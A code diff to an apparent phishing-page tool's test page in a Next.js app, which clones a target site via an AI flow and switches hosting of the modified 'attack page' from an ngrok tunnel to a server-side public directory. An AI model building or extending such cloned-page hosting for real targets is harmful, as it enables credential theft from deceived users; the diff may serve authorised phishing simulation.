@@ -13,7 +13,7 @@ import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
 import { Loader2, Wand, Share2, Clipboard, Globe } from 'lucide-react';
 import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
-import { startNgrokTunnel } from '@/services/ngrok-service';
+import { hostTestPage } from '@/actions/host-test-page-action';
 import { logActivity } from '@/services/activity-log-service';
 import { useAuth } from '@/hooks/use-auth';
 import Link from 'next/link';
@@ -104,16 +104,11 @@ export default function TestPage() {
     setHostedUrl(null);
     
     try {
-      toast({ title: "Generating Public Link...", description: "Starting ngrok tunnel. This may take a moment." });
-      const { url } = await startNgrokTunnel();
+      toast({ title: "Hosting Page...", description: "Writing file to public directory on the server." });
+      const { url } = await hostTestPage(modifiedHtml);
 
       if (url) {
-        const pageId = crypto.randomUUID();
-        const pageStorageKey = `phishing-html-${pageId}`;
-        localStorage.setItem(pageStorageKey, modifiedHtml);
-
-        const finalUrl = `${url}/phish/${pageId}`;
-        setHostedUrl(finalUrl);
+        setHostedUrl(url);
         toast({ title: "Public Link Generated!", description: "Your attack page is now live." });
 
         logActivity({
@@ -122,7 +117,7 @@ export default function TestPage() {
             details: `Target: ${form.getValues('targetUrl')}`,
         });
       } else {
-         throw new Error("Ngrok did not return a URL.");
+         throw new Error("Hosting action did not return a URL.");
       }
     } catch(err) {
         const error = err instanceof Error ? err.message : "An unknown error occurred";
@@ -136,7 +131,7 @@ export default function TestPage() {
     <div className="flex flex-col gap-6">
       <div>
         <h1 className="font-headline text-3xl font-semibold">Isolated Link Sharing Test</h1>
-        <p className="text-muted-foreground">This page is for testing public link generation via ngrok.</p>
+        <p className="text-muted-foreground">This page is for testing public link generation via server-side hosting.</p>
       </div>
       <Card>
         <CardHeader>
